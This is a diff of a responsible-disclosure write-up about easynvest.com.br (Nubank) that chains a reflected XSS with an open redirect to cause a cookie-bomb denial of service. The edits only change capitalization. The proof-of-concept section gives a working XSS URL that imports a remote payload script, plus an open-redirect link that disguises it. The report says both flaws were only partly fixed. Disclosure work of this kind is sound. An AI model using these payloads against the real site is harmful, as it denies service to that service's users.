@@ -17,7 +17,7 @@ Table of contents:
 
 ### Summary
 
-During a security analysis of the web application operated by easynvest.com.br (acquired by Nubank), two client-side vulnerabilities were identified. When combined, these flaws can be exploited to compromise the availability of the service for legitimate users. Specifically, the attack chain enables a Denial of Service (DoS) condition through client-side exploitation.
+During a security analysis of the web application operated by easynvest.com.br (acquired by Nubank), two client-side vulnerabilities were identified. When combined, these flaws can be exploited to compromise the availability of the service for legitimate users. Specifically, the attack chain enables a denial of service (DoS) condition through client-side exploitation.
 
 Timeline
 
@@ -56,23 +56,23 @@ Although the vulnerability is exploitable, its impact is limited by several fact
 * Being a reflected XSS, it is not easily propagated without user interaction;
 * The main domain enforces strong security policies, including anti-CSRF tokens, and headers such as X-Frame-Options (XFO), Content Security Policy (CSP), and CORS.
 
-Given these constraints, the investigation focused on identifying a complementary vulnerability that could be chained with the reflected XSS. Analysis of the authentication page's JavaScript revealed an Open Redirect vulnerability ([3], [4]):
+Given these constraints, the investigation focused on identifying a complementary vulnerability that could be chained with the reflected XSS. Analysis of the authentication page's JavaScript revealed an open redirect vulnerability ([3], [4]):
 
 [https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()
 
 Demo:
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 This unvalidated redirect on the main domain allows malicious payloads to be delivered more reliably, partially bypassing the limitations of the subdomain-restricted XSS. However, further exploitation aimed at Account Takeover, data exfiltration, or critical actions was unsuccessful due to the application’s enforcement of Multi-Factor Authentication (MFA) for sensitive operations ([7]).
 
-As an alternative, the combination of the vulnerabilities was leveraged to perform a Cookie Bomb attack, with the goal of rendering the application unavailable for users who visit a crafted malicious link. The attack involves injecting an excessive number of oversized cookies, surpassing server processing thresholds. As a result, subsequent requests from the affected browser are rejected, causing the application to fail to load—effectively creating a client-specific Denial of Service condition. Modern browsers typically allow multiple cookies, each up to ~4KB in size. However, most servers are not designed to handle unusually large volumes of cookie data, leading to application inaccessibility until the user manually clears the cookies or they expire.
+As an alternative, the combination of the vulnerabilities was leveraged to perform a cookie bomb attack, with the goal of rendering the application unavailable for users who visit a crafted malicious link. The attack involves injecting an excessive number of oversized cookies, surpassing server processing thresholds. As a result, subsequent requests from the affected browser are rejected, causing the application to fail to load—effectively creating a client-specific denial of service condition. Modern browsers typically allow multiple cookies, each up to ~4KB in size. However, most servers are not designed to handle unusually large volumes of cookie data, leading to application inaccessibility until the user manually clears the cookies or they expire.
 
 For in-depth understanding, refer to: "Cookie Bomb or Let's Break the Internet" [9] by Egor Homakov "Denial of Service with Cookie Bomb" [10] by filedescriptor.
 
 ---
 
-### Proof of Concept
+### Proof of concept
 
 The exploitation chain proceeds as follows:
 
@@ -96,13 +96,13 @@ window.location="https://" + document.domain;
     
     [https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()
 
-3. Use an Open Redirect (with a shortened URL) to obfuscate the malicious payload: [https://cutt.ly/syPnJXp]()
+3. Use an open redirect (with a shortened URL) to obfuscate the malicious payload: [https://cutt.ly/syPnJXp]()
 
 Final chained payload: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()
 
 And this was the result:
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 ---
 
@@ -114,10 +114,10 @@ This attack chain enables an adversary to induce localized unavailability of the
 
 ### Conclusion
 
-The exploitation described requires relatively low technical effort but can have a notable impact on user experience. By chaining a reflected XSS with an Open Redirect, it is possible to execute a Cookie Bomb attack resulting in targeted denial of service. Although this vector is not commonly exploited in real-world attacks, it is effective under the right conditions.
+The exploitation described requires relatively low technical effort but can have a notable impact on user experience. By chaining a reflected XSS with an open redirect, it is possible to execute a cookie bomb attack resulting in targeted denial of service. Although this vector is not commonly exploited in real-world attacks, it is effective under the right conditions.
 Following responsible disclosure, the company took the following actions:
 
-* No definitive remediation was applied to the Open Redirect vulnerability;
+* No definitive remediation was applied to the open redirect vulnerability;
 * The XSS vulnerability was partially mitigated via Web Application Firewall (WAF) rules, although multiple bypasses were identified. Technical feedback was provided, but no further updates were received.
 
 ---
